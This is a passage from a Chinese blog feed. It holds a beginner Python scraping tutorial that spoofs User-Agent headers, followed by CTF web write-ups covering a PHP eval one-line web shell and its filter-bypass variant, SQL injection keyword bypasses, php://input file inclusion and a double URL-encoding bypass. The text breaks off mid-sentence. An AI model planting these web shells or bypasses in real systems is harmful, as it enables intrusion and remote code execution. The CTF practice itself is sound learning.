        <content type="html"><![CDATA[<p>前言：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;又一个寒假到来了，一直对爬虫很感兴趣但在学校没时间学（大概是太懒了（╯＿╰），趁着这个寒假来学习一下(ง •_•)ง。<br>@[toc]</p><h4 id="一、爬虫基础简介："><a href="#一、爬虫基础简介：" class="headerlink" title="一、爬虫基础简介："></a>一、爬虫基础简介：</h4><h5 id="1、首先-什么是爬虫？"><a href="#1、首先-什么是爬虫？" class="headerlink" title="1、首先 什么是爬虫？"></a>1、首先 什么是爬虫？</h5><ul><li>学术概念：爬虫就是通过编写程序模拟浏览器上网，让其去互联网上抓取数据的过程。</li><li>形象概念： 爬虫，即网络爬虫，大家可以理解为在网络上爬行的一直蜘蛛，互联网就比作一张大网，而爬虫便是在这张网上爬来爬去的蜘蛛咯，如果它遇到资源，那么它就会抓取下来。想抓取什么，这个由你来控制它。</li></ul><h5 id="2、哪些语言可以实现爬虫？"><a href="#2、哪些语言可以实现爬虫？" class="headerlink" title="2、哪些语言可以实现爬虫？"></a>2、哪些语言可以实现爬虫？</h5><ul><li>PHP：可以实现爬虫。php被号称是全世界最优美的语言（当然是其自己号称的😂），但是php在实现爬虫中支持多线程和多进程方面做的不好。</li><li>C、C++：可以实现爬虫。但是使用这种方式实现爬虫纯粹是是某些人（大佬们）能力的体现，却不是明智和合理的选择。</li><li>Java：可以实现爬虫。java可以非常好的处理和实现爬虫，是唯一可以与python并驾齐驱且是python的头号劲敌。但是java实现爬虫代码较为臃肿，重构成本较大。</li><li>Python：可以实现爬虫。python实现和处理爬虫语法简单，代码优美，支持的模块繁多，学习成本低，具有非常强大的框架且一语难以言表的好！没有但是！</li></ul><p>因此本次的爬虫学习是基于python实现的（并不是Java学的不好 →_→）。</p><h5 id="3、爬虫的分类："><a href="#3、爬虫的分类：" class="headerlink" title="3、爬虫的分类："></a>3、爬虫的分类：</h5><ul><li>通用爬虫：通用爬虫是搜索引擎（Baidu、Google等）“抓取系统”的重要组成部分。主要目的是将互联网上的网页下载到本地，形成一个互联网内容的镜像备份。 简单来讲就是尽可能的；把互联网上的所有的网页下载下来，放到本地服务器里形成备分，在对这些网页做相关处理(提取关键字、去掉广告)，最后提供一个用户检索接口。</li><li>聚焦爬虫：聚焦爬虫是根据指定的需求抓取网络上指定的数据。例如：获取豆瓣上电影的名称和影评，而不是获取整张页面中所有的数据值。</li><li>增量式爬虫：增量式是用来检测网站数据更新的情况，且可以将网站更新的数据进行爬取。</li></ul><h4 id="二、requests模块"><a href="#二、requests模块" class="headerlink" title="二、requests模块:"></a>二、requests模块:</h4><p>在python实现的网络爬虫中，用于网络请求发送的模块有两种，第一种为urllib模块，第二种为requests模块。urllib模块是一种比较古老的模块，在使用的过程中较为繁琐和不便。当requests模块出现后，就快速的代替了urllib模块，因此推荐使用requests模块。</p><h5 id="1、什么是requests？"><a href="#1、什么是requests？" class="headerlink" title="1、什么是requests？"></a>1、什么是requests？</h5><ul><li>requests模块是python中原生的基于网络请求的模块，其主要作用是用来模拟浏览器发起请求。功能强大，用法简洁高效。在爬虫领域中占据着半壁江山的地位。</li></ul><h5 id="2、如何使用requests模块："><a href="#2、如何使用requests模块：" class="headerlink" title="2、如何使用requests模块："></a>2、如何使用requests模块：</h5><p>1、环境安装：</p><pre><code class="bash">pip install requests</code></pre><p>2、使用流程：</p><ol><li><p>指定url</p></li><li><p>基于requests模块发起请求</p></li><li><p>获取响应对象中的数据值</p></li><li><p>持久化存储</p></li></ol><h5 id="3、第一个爬虫程序："><a href="#3、第一个爬虫程序：" class="headerlink" title="3、第一个爬虫程序："></a>3、第一个爬虫程序：</h5><p>需求：爬取网易云首页的页面数据</p><pre><code class="python">#导包import requests#指定urlurl = &#39;https://music.163.com/&#39;#发起请求:发起 get请求，该方法会返回一个响应对象。response = requests.get(url=url)#获取响应数据:通过调用响应对象的text属性，返回响应对象中存储的字符串形式的响应数据（页面源码数据）page_text = response.text#持久化存储with open(&#39;./wangyiyun.html&#39;,&#39;w&#39;,encoding=&#39;utf-8&#39;) as fp:    fp.write(page_text)print(&#39;爬取数据完成！&#39;)</code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20210112222514797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>虽然和原网页不一样（没有样式），但是数据爬取成功了。</p><h5 id="4、实例练习："><a href="#4、实例练习：" class="headerlink" title="4、实例练习："></a>4、实例练习：</h5><p><strong>实例一</strong>：</p><p>基于requests模块的get请求：</p><p>需求：爬取搜狗指定词条对应的搜索结果页面（简易网页采集器）</p><p>反爬机制：</p><ul><li>User-Agent：请求载体的身份标识，使用浏览器发起的请求，请求载体的身份标识为浏览器，使用爬虫程序发起的请求，请求载体为爬虫程序。</li><li>UA检测：相关的门户网站通过检测请求该网站的载体身份来辨别该请求是否为爬虫程序，因为正常用户对网站发起的请求的载体一定是基于某一款浏览器，如果网站检测到某一请求载体身份标识不是基于浏览器的，则让其请求失败。因此，UA检测是遇到的第二种反爬机制，第一种是robots协议。</li></ul><p>如何绕过：</p><ul><li>可以通过设置爬虫请求的User-Agent来破解UA检测这种反爬机制，具体实现见下面代码：</li></ul><pre><code class="python">#!/usr/bin/env python# -*- coding:utf-8 -*-import requestsif __name__ == &#39;__main__&#39;:    # UA伪装：将对应的User-Agent封装到一个字典中    headers = &#123;        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&#39;    &#125;    url = &#39;https://www.sogou.com/web&#39;    kw = input(&#39;输入关键词：&#39;)    param = &#123;        &#39;query&#39;: kw    &#125;    response = requests.get(url=url, params=param, headers=headers)    page_text = response.text    filename = kw + &#39;.html&#39;    with open(filename, &#39;w&#39;, encoding=&#39;utf-8&#39;) as fp:        fp.write(page_text)    print(filename, &#39;保存成功！&#39;)</code></pre><p>运行：<br><img src="https://img-blog.csdnimg.cn/20210113160900260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开保存的数据：</p><p><img src="https://img-blog.csdnimg.cn/20210113160951688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>爬取成功（￣︶￣）↗　</p><p>如果没有设置UA数据，则会得到这样的页面：<br><img src="https://img-blog.csdnimg.cn/2021011316115254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>示例二</strong>：</p><p>基于requests模块的post请求</p><p>需求：破解百度翻译，即获取箭头处的数据。<br><img src="https://img-blog.csdnimg.cn/20210114124831502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="python">#!/usr/bin/env python# -*- coding:utf-8 -*-import requestsimport jsonif __name__ == &quot;__main__&quot;:    # 1.指定url    post_url = &#39;https://fanyi.baidu.com/sug&#39;    # 2.UA伪装    headers = &#123;        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&#39;    &#125;    # 3.post请求参数处理    word = input(&#39;enter a word:&#39;)    data = &#123;        &#39;kw&#39;: word    &#125;    # 4.请求发送    response = requests.post(url=post_url, data=data, headers=headers)    # 5.获取响应数据:json()方法返回的是obj（如果确认响应数据是json类型的，才可以使用json（））    dic_obj = response.json()    # 持久化存储    fileName = word + &#39;.json&#39;    fp = open(fileName, &#39;w&#39;, encoding=&#39;utf-8&#39;)    json.dump(dic_obj, fp=fp, ensure_ascii=False)//存在中文，需要禁用ascii码    print(&#39;数据爬取完成！&#39;)</code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20210113225805874.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210113225824531.png" alt="在这里插入图片描述"><br>爬取成功！</p><p><strong>示例三</strong>：</p><p>基于requests模块ajax的get请求</p><p>需求：爬取豆瓣电影某分类排行榜中的电影详情数据。<br><img src="https://img-blog.csdnimg.cn/20210114124657497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="python">#!/usr/bin/env python# -*- coding:utf-8 -*-import requestsimport jsonif __name__ == &#39;__main__&#39;:    url = &#39;https://movie.douban.com/j/chart/top_list&#39;    param = &#123;        &#39;type&#39;: &#39;17&#39;,        &#39;interval_id&#39;: &#39;100:90&#39;,        &#39;action&#39;: &#39;&#39;,        &#39;start&#39;: &#39;0&#39;,  # 从库中的第几部电影去取        &#39;limit&#39;: &#39;20&#39;,  # 一次取出的个数    &#125;    headers = &#123;        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&#39;    &#125;    response = requests.get(url=url, params=param, headers=headers)    list_data = response.json()    fp = open(&#39;./douban.json&#39;, &#39;w&#39;, encoding=&#39;utf-8&#39;)    json.dump(list_data, fp=fp, ensure_ascii=False)    print(&#39;数据爬取完成！&#39;)</code></pre><p>运行结果；<br><img src="https://img-blog.csdnimg.cn/20210114124238982.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210114124223989.png" alt="在这里插入图片描述">可以看到爬取的数据是正确的。</p><p><strong>示例四</strong>：</p><p>基于requests模块ajax的post请求</p><p>需求：爬取肯德基餐厅查询 <a href="http://www.kfc.com.cn/kfccda/index.aspx">http://www.kfc.com.cn/kfccda/index.aspx</a> 中指定地点的餐厅数据。<br><img src="https://img-blog.csdnimg.cn/20210114130022186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="python">#!/usr/bin/env python# -*- coding:utf-8 -*-import requestsif __name__ == &quot;__main__&quot;:    url = &#39;http://www.kfc.com.cn/kfccda/ashx/GetStoreList.ashx?op=keyword&#39;    kw = input(&#39;输入地址：&#39;)    param = &#123;        &#39;cname&#39;: &#39;&#39;,        &#39;pid&#39;: &#39;&#39;,        &#39;keyword&#39;: kw,        &#39;pageIndex&#39;: &#39;1&#39;,        &#39;pageSize&#39;: &#39;10&#39;    &#125;    headers = &#123;        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&#39;    &#125;    response = requests.get(url=url, params=param, headers=headers)    page_text = response.text    filename = kw + &#39;.html&#39;    with open(filename, &#39;w&#39;, encoding=&#39;utf-8&#39;) as fp:        fp.write(page_text)    print(&#39;数据爬取完成！&#39;)</code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20210114131714777.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210114131700913.png" alt="在这里插入图片描述"></p><p><strong>综合练习</strong>：</p><p>需求：爬取 国家药品监督管理局基于化妆品生产许可信息数据 <a href="http://scxk.nmpa.gov.cn:81/xk/">http://scxk.nmpa.gov.cn:81/xk/</a>:</p><p>网站首页：<br><img src="https://img-blog.csdnimg.cn/2021011422454998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 详细信息即要爬取得的数据：<img src="https://img-blog.csdnimg.cn/20210114224643592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="python">#!/usr/bin/env python# -*- coding:utf-8 -*-import requestsimport jsonif __name__ == &#39;__main__&#39;:    id_list = []  # 储存企业id    all_date_list = []  # 储存详细信息    headers = &#123;        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&#39;    &#125;    url = &#39;http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsList&#39;    for page in range(1, 6):        page = str(page)        data = &#123;            &#39;on&#39;: &#39;true&#39;,            &#39;page&#39;: page,            &#39;pageSize&#39;: &#39;15&#39;,            &#39;productName&#39;: &#39;&#39;,            &#39;conditionType&#39;: &#39;1&#39;,            &#39;applyname&#39;: &#39;&#39;,            &#39;applysn&#39;: &#39;&#39;        &#125;        json_ids = requests.post(url=url, data=data, headers=headers).json()        for dic in json_ids[&#39;list&#39;]:            id_list.append(dic[&#39;ID&#39;])    url = &#39;http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsById&#39;    for id in id_list:        data = &#123;            &#39;id&#39;: id        &#125;        detail_json = requests.post(url=url, headers=headers, data=data).json()        all_date_list.append(detail_json)    fp = open(&#39;./allData.json&#39;, &#39;w&#39;, encoding=&#39;utf-8&#39;)    json.dump(all_date_list, fp=fp, ensure_ascii=False)    print(&quot;数据爬取完成！&quot;)</code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/2021011513432713.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210115134353933.png" alt="在这里插入图片描述"><br>爬取成功！<hr></p><p>🆗，第一篇暂时先练习这么多了。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋做题记录 web(一)</title>
      <link href="2019/11/03/i%E6%98%A5%E7%A7%8B%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%20web(%E4%B8%80)/"/>
      <url>2019/11/03/i%E6%98%A5%E7%A7%8B%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%20web(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<p>前言：<br>时间过的真快呀，一转眼半学期就过去了(￣m￣）；攻防世界上的题差不多刷完了(剩下的都是不会的T_T)，这周就来做做 i春秋的题，顺便记录下。<hr></p><a id="more"></a><h3 id="1、想怎么传就怎么传，就是这么任性。"><a href="#1、想怎么传就怎么传，就是这么任性。" class="headerlink" title="1、想怎么传就怎么传，就是这么任性。"></a>1、想怎么传就怎么传，就是这么任性。</h3><p>题型：    Web Upload<br><img src="http://img-blog.csdnimg.cn/20191030162630590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这题就是一个简单的文件上传题目；先用一个普通的php小马试一下：<code>&lt;?php @eval($_POST[&#39;smk&#39;]);?&gt;</code><br>然后发现文件是上传成功了，但是<code>&lt;? php</code>被过滤掉了<br>于是在网上找到另一个一句话，将php用大写绕过 修改后如下：<br><code>&lt;script language=&quot;pHp&quot;&gt;@eval($_POST[&#39;smk&#39;])&lt;/script&gt;</code><br>然后连接菜刀就能看到flag了。<br><img src="http://img-blog.csdnimg.cn/20191103172707128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="2、出题人就告诉你这是个注入，有种别走！"><a href="#2、出题人就告诉你这是个注入，有种别走！" class="headerlink" title="2、出题人就告诉你这是个注入，有种别走！"></a>2、出题人就告诉你这是个注入，有种别走！</h3><p>题型：    Web Sql<br><img src="http://img-blog.csdnimg.cn/20191030162853663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开题目：<br><img src="http://img-blog.csdnimg.cn/20191103162535997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到题目的url就知道要对id注入。首先试一下order by，发现错误，可能是关键字过滤。试了试<code>/**/</code>还是不行，改用<code>&lt;&gt;</code>发现可以了，如图：<br><img src="http://img-blog.csdnimg.cn/2019110316284923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试得字段数为3，接下来就没啥好说的了，按顺序，爆库爆表爆字段<br><img src="http://img-blog.csdnimg.cn/20191103163918156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20191103164216508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20191103164928944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20191103165117879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag。</p><h3 id="3、这个真的是爆破。"><a href="#3、这个真的是爆破。" class="headerlink" title="3、这个真的是爆破。"></a>3、这个真的是爆破。</h3><p>题型：Misc    Web<br><img src="http://img-blog.csdnimg.cn/20191030195146808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开题目，看到一段php语句：</p><pre><code>error_reporting(0);// 关闭错误报告session_start();//启动会话require(&#39;./flag.php&#39;);if(!isset($_SESSION[&#39;nums&#39;]))&#123;//isset() — 检测变量是否设置。  $_SESSION[&#39;nums&#39;] = 0;  $_SESSION[&#39;time&#39;] = time();//返回当前时间的 Unix 时间戳  $_SESSION[&#39;whoami&#39;] = &#39;ea&#39;;&#125;if($_SESSION[&#39;time&#39;]+120&lt;time())&#123;  session_destroy();//session_destroy — 销毁一个会话中的全部数据&#125;//120s后会话结束$value = $_REQUEST[&#39;value&#39;];$str_rand = range(&#39;a&#39;, &#39;z&#39;);//range创建一个包含从 &quot;a&quot; 到 &quot;z&quot; 之间的元素范围的数组$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];//mt_rand() 使用 Mersenne Twister 算法返回0到25之间的随机整数。$str_rand[mt_rand(0,25)]返回&quot;a&quot; 到 &quot;z&quot;之间任意字母。$str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)]是两任意字母相连if($_SESSION[&#39;whoami&#39;]==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0)&#123;//substr(string,start,length)。===是包括变量值与类型完全相等。==只是比较两个数的值是否相等，由于substr是字符串，和数字比较的时候会强制转化成数字0，自然和0相等。  $_SESSION[&#39;nums&#39;]++;  $_SESSION[&#39;whoami&#39;] = $str_rands;  echo $str_rands;&#125;if($_SESSION[&#39;nums&#39;]&gt;=10)&#123;//循环10次输出flag，暴力破解  echo $flag;&#125;show_source(__FILE__);?&gt;</code></pre><p>因为md5不能对数组进行处理，MD5()计算数组会返回null，里面的判断是用==所以我们用数组传值那么<code>substr(md5($value),5,4)==0</code>这个条件恒成立。<br>因为我刚访问由于这段代码<code>$_SESSION[&#39;whoami&#39;] = &#39;ea&#39;;</code> 我们要先传入<code>?value[]=ea</code> </p><p>那么nums就会自增，<code>$_SEESION[&#39;whoami&#39;] = 随机2个字母</code> </p><p>并同时输出到页面上，我们再根据输出的字符修改<code>$value[0].$value[1]</code>的值即可，只要操作大于等于10次，就可以出flag 。<br><img src="http://img-blog.csdnimg.cn/20191103170830809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>综上所述循环10次后输出flag：<br><img src="http://img-blog.csdnimg.cn/20191030175352961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="4、没错！就是文件包含漏洞"><a href="#4、没错！就是文件包含漏洞" class="headerlink" title="4、没错！就是文件包含漏洞"></a>4、没错！就是文件包含漏洞</h3><p>题型：Web Upload<br>知识点：<br>1、当php开启allow_url_include的时候，可以用php://input伪协议包含文件<br>2、php中的system命令执行函数<br><img src="http://img-blog.csdnimg.cn/20191031202054697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这题也挺简单，利用了<strong>php伪协议</strong> ：</p><ol><li>php://input<br>构造场景：本地web服务器根目录下有文件<code>phpinput_server.php</code>，代码如下：<pre><code>&lt;?php  $a = $_GET[&#39;a&#39;];  $raw_post_data = file_get_contents($a,&#39;r&#39;);//&#39;php://input&#39;  echo $raw_post_data;?&gt;</code></pre></li></ol><p>在浏览器中按照如下方式访问：<br>地址栏输入的是：<code>http://localhost/phpinput_server.php?a=php://input</code><br>post框直接输入一段数据<br>Excute后，脚本会在页面中输出这段数据。<br><img src="http://img-blog.csdnimg.cn/20191031203305913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>总结：此种方式可以用来获取post数据，但不能获取get数据。</p><p>既然题目是文件包含，我们来看下关键性函数的状态<br>allow_url_include<br><img src="http://img-blog.csdnimg.cn/20191031205339435.png" alt="在这里插入图片描述"><br>当<code>allow_url_include</code>为On而<code>allow_url_fopen</code>为Off的时候，我们可以用用<strong>php://input</strong>伪协议进行包含<br><img src="https://img-blog.csdnimg.cn/20191031205614164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到目录下有三个文件，flag是在第一个文件里<br>查看dle345aae.php：<br><img src="http://img-blog.csdnimg.cn/20191031212358170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">右键查看源码：得到flag<br><img src="http://img-blog.csdnimg.cn/20191031201323703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界 Web进阶(一)</title>
      <link href="2019/10/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20Web%E8%BF%9B%E9%98%B6(%E4%B8%80)/"/>
      <url>2019/10/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20Web%E8%BF%9B%E9%98%B6(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<p>嗯..,终于把新手区的题做完了，感觉学到了不少东西( •̀ ω •́ )y   今天来记录下进阶题<br>1、ics-06<br>2、PHP2<br>3、mfw</p><a id="more"></a><p><strong>1、ics-06</strong><br><img src="http://img-blog.csdnimg.cn/20191013201933147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开题目，一个看起来看来很炫酷的页面，瞎点一会发现只有一个报表中心可以进<br><img src="http://img-blog.csdnimg.cn/20191013203721575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一开始以为是sql注入题，尝试了一会发现不是，这题考察的是爆破，当id=2333时，得到flag。</p><p><img src="http://img-blog.csdnimg.cn/20191013212440794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>2、PHP2</strong><br><img src="http://img-blog.csdnimg.cn/20191015191306595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开题目，御剑扫描，如果扫不到就说明你字典里需要添上了。<br><img src="http://img-blog.csdnimg.cn/20191015191627512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现index.phps源码泄露，打开网页：<br><img src="http://img-blog.csdnimg.cn/20191015192041765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>即：</p><pre><code>&lt;?phpif(&quot;admin&quot;===$_GET[id]) &#123;  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);  exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;admin&quot;)&#123;  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;  echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;&#125;?&gt;Can you anthenticate to this website?</code></pre><p>审计下代码，发现 要得到flag要满足两个条件<br>一，要使<code>&quot;admin&quot;===$_GET[id]</code>不成立<br>二，经过<code>$_GET[id] = urldecode($_GET[id]);</code>，使得<code>$_GET[id] == &quot;admin&quot;</code>成立。</p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p>1、Url的编码格式采用的是ASCII码(16进制) 不能在Url中包含任何非ASCII字符，例如中文，如果Url中含有非ASCII字符的话, 浏览器会对Url进行urlencode，然后发送给服务器</p><p>2、关于<code>urldecode/urlencode</code>函数：<br>当传入参数id时，浏览器在后面会对非ASCII码的字符进行一次urlencode<br>然后在这段代码中运行时，会自动进行一次urldecode<br>在urldecode()函数中，再一次进行一次解码</p><pre><code>urldecode(%2561)=%61urldecode(%61)=a</code></pre><p>当第一次比较时，实际是</p><pre><code>if(&quot;admin&quot;===&quot;%61dmin&quot;) </code></pre><p>而经过<code>$_GET[id] = urldecode($_GET[id]);</code></p><p>第二次比较是：</p><pre><code>if(&quot;admin&quot; == 